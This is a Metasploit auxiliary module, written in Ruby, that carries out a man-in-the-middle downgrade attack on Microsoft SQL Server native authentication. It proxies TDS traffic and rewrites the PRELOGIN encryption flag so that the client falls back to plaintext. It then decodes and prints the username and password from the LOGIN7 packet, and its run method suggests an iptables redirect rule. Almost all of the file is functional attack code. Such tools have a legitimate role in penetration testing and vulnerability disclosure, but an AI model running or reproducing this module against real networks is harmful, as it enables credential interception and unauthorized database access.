require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	# we mixin both Tcp and TcpServer, hope this doesn't break anything
	include Msf::Exploit::Remote::Tcp
	alias_method :cleanup_tcp, :cleanup
	alias_method :run_tcp, :run
	include Msf::Exploit::Remote::TcpServer
	alias_method :cleanup_tcpserver, :cleanup
	alias_method :run_tcpserver, :run
	alias_method :exploit_tcpserver, :exploit
# seems like there is a lot of mssql stuff implemented in metasploit, none of which seems useful here
#	include Msf::Exploit::Remote::MSSQL

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'MSSQL Native Authentication Downgrade Attack',
			'Description'    => %q{
This tool shows that the default configuration of Microsoft SQL Server and 
clients, is not secure if the SQL Server native authentication is used and the 
network cannot be trusted. Per default, the login credentials are submitted 
encrypted via a TLS/SSL.
If an attacker can perform any kind of mitm attack, the attacker is able to 
trick the client/server into believing that encryption is not supported and, as
a fallback mechanism, the login credentials are submitted as plaintext.
},
			'Author' 	 =>
				[
					'Michael Rodler'
				],
			'License'        => BSD_LICENSE,
			'Version'        => "1.0",
			'References'     =>
				[
					[ 'URL', 'http://msdn.microsoft.com/en-us/library/dd304523%28v=PROT.13%29.aspx' ],
					[ 'URL', 'http://f0rki.at/microsoft-sql-server-downgrade-attack.html' ],
				],
			'Privileged'     => false,
			'DisclosureDate' => '2011-12-25',))

		deregister_options('SSL', 'SSLCert', 'SSLVersion', 'RPORT')
	
		register_options(
			[
				OptPort.new('SRVPORT', [ true, "TCP Port of the MSSQL Server. Also local listen port.", 1433 ]),
				OptString.new('SRVHOST', [ true, "Local listen address.", "0.0.0.0" ]),
				OptString.new('RHOST', [ true, "IP-Address of the MSSQL Server.", "0.0.0.0" ]),
			], self.class)
		
		datastore["RPORT"] = datastore["SRVPORT"]
	end
	

	def decode_tds_password(password)
		# This function decodes the password...
		# note that this is the reverse thing to
		# Msf::Exploit::Remote::MSSQL.mssql_tds_encrypt
		#citing MS-TDS specification:
		#\"Before submitting a password from the client to the server, for
		#every byte in the password buffer starting withthe position pointed
		#to by IbPassword, the client SHOULD first swap the four high bits
		#with the four low bits and then do a bit-XOR with 0xA5 (10100101). After
		#reading a submitted password, for every byte in the password buffer 
		#starting with the position pointed to by IbPassword, the server SHOULD 
		#first do a bit-XOR with 0xA5 (10100101) and then swap the four high bits 
		#with the four low bits.\""""
		return password if password.nil? or password.length == 0
		password = password.unpack("C*")
		plain = []
		password.each do |char|
			a = char ^ 0xA5
			high = (a & 0xf0) >> 4
			low = (a & 0x0f) << 4
			a = high ^ low
			plain << a
		end
		return plain.pack("C*")
	end

	def run
		print_status("set your firewall to something like this:")
		print_status("iptables -t nat -A PREROUTING -p tcp --dport 1433 -j REDIRECT --to-port 1433")
		exploit_tcpserver
	end
	alias_method :exploit, :run
	
	def cleanup
		cleanup_tcp()
		cleanup_tcpserver()
	end
    
    def on_client_connect(client)
    	print_status("client connected " + client.peerinfo())
    	connect()
	end

	def on_client_close(client)
		print_status("client disconnected " + client.peerinfo())
		disconnect()
	end
	
	def on_client_data(client)
		begin
			data = client.get_once()
			return if data.nil? or data.length == 0
			#print_status("received the following from client")
			#print_status(Rex::Text::to_hex_dump(data))
			data = mangle_packet_from_client(data)
			#print_status("sending the following to server")
			#print_status(Rex::Text::to_hex_dump(data))
			sock.send(data, 0)
			respdata = sock.get_once()
			return if respdata.nil? or respdata.length == 0
			#print_status("received the following from server")
			#print_status(Rex::Text::to_hex_dump(respdata))
			respdata = mangle_packet_from_server(respdata)
			#print_status("sending the following to client")
			#print_status(Rex::Text::to_hex_dump(respdata))
			client.put(respdata)
		rescue ::EOFError, ::Errno::EACCES, ::Errno::ECONNABORTED, ::Errno::ECONNRESET
		rescue ::Exception
			print_status("Error: #{$!.class} #{$!} #{$!.backtrace}")
		end
	end
	
	def mangle_packet_from_client(packet)
		header_type = get_header_type(packet)
		pl = packet[8, packet.length]
		if header_type == 'PRELOGIN'
			pl = modify_prelogin(pl)
			return packet[0,8] << pl
		elsif header_type == "LOGIN7"
			pl = parse_login7(pl)
			return packet[0,8] << pl
		end #if
		return packet
	end #method
	
	def mangle_packet_from_server(packet)
		header_type = get_header_type(packet)
		pl = packet[8, packet.length]
		if header_type == 'PRELOGIN'
			pl = modify_prelogin(pl)
			return packet[0,8] << pl
		end #if
		return packet
	end #method
	
	def get_header_type(packet)
		#tds_header = packet[0,8].unpack("CCnnCC")
		#hdr_type = tds_header[0]
		hdr_type = packet[0].unpack("C")[0]
		if hdr_type == 0x12
			return "PRELOGIN"
		elsif hdr_type == 0x04
			return "Tabular Response"
		elsif hdr_type == 16
			return "LOGIN7"
		elsif hdr_type == 1
			return "SQL Batch"
		elsif hdr_type == 2
			return "Pre-TDS7 Login"
		elsif hdr_type == 3
			return "RPC"
		elsif hdr_type == 7
			return "Bulk load data"
		elsif hdr_type == 17
			return "SSPI"
		else
			return "Unkown"
		end
	end
	
	def modify_prelogin(prelogin)
		return prelogin if prelogin.nil? or prelogin.length == 0
		i = 0
		while prelogin[i].unpack('C')[0] != 0xFF do
			position, length = prelogin[i+1,i+5].unpack("nn")
			option_token = prelogin[i].unpack("C")[0]
			if option_token == 0x00 # PL_OPTION_TOKEN == VERSION
				if length != 6
					#"Error: AARGGH! Out of spec or parsing fubar! version length: 0x%X\n"
					print_status("Error: Skipping current packet")
					return prelogin
				end
				version, subbuild = prelogin[position,position+length].unpack(">Nn")
				print_status("version: 0x" + version.to_s(16) + " subbuild: 0x" + subbuild.to_s(16))
			elsif option_token == 0x01 # PL_OPTION_TOKEN == ENCRYPTION
				if length != 1
					# "Error: AARGGH! Out of spec or parsing fubar! encryption length
					print_status("Error: Skipping current packet")
					return prelogin
				end
				enc = prelogin[position].unpack("C")[0]
				if enc == 0x00
					print_status("ENCRYPT is set to ENCRYPT_OFF")
				elsif enc == 0x01
					print_status("ENCRYPT is set to ENCRYPT_ON")
					print_status("Depending on the used client, the attack will probably not succeed!")
				elsif enc == 0x02
					print_status("ENCRYPT is set to ENCRYPT_NOT_SUP")
					print_status("Encryption is not supported, we will be able to see the cleartext password")
				elsif enc == 0x03
					print_status("ENCRYPT is set to ENCRYPT_REQ")
					print_status("This suggests a secure configuration!")
				else
					print_status("ENCRYPT set to 0x" + enc.to_s(16) + 
									" for some reason. This is out of spec... Let's skip it!")
					return packet
				end
            
				if enc != 0x02
					print_status("Setting to: ENCRYPT_NOT_SUP == 0x02")
					prelogin[position] = "\x02"
				end
				
				break # we did the evil deed, so we can leave the loop...
			end
			i += 5
		end #while loop
		
		return prelogin
		
	end #method
	
	def parse_login7(tds_pl) # just the tds packet paylod, without header
		print_status("Found TDS LOGIN7 packet, dumping information:")
		print_status("#############################################")
		['HostName', 'UserName', 'Password','Application', 'Server', nil, 'Library'].zip((36..62).step(4)).each do |name, o|
			if not name.nil?
				offset, length = tds_pl[o, 4].unpack("vv")
				length = length * 2 # since we are parsing unicode widechars...
				val = tds_pl[offset, length]
				if name == "Password"
					val = decode_tds_password(val)
				end
				print_status(name + ": " + val.force_encoding("LATIN1").encode("UTF-8"))			
			end
		end #each
		print_status("#############################################")
		return tds_pl
	end #method
	
end #class
